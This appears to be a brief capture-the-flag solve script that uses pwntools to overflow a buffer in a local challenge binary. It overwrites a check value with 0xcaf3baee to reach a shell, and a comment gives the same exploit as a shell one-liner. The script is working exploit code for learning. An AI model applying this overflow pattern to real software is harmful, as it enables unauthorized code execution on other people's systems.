from pwn import *

context(arch='amd64', os='linux')
p = process('./boi')    # binary path

# p32() takes care of little endian
payload = b'A' * 20 + p32(0xcaf3baee)   # b'A' is necessary, because pwn used bytes, not str

p.send(payload)

p.interactive()  # Takes over stdin/stdout for shell interaction

# another way to solve, without pwntools, is:
# (echo -ne "AAAAAAAAAAAAAAAAAAAA\xee\xba\xf3\xca"; cat -) | ./boi
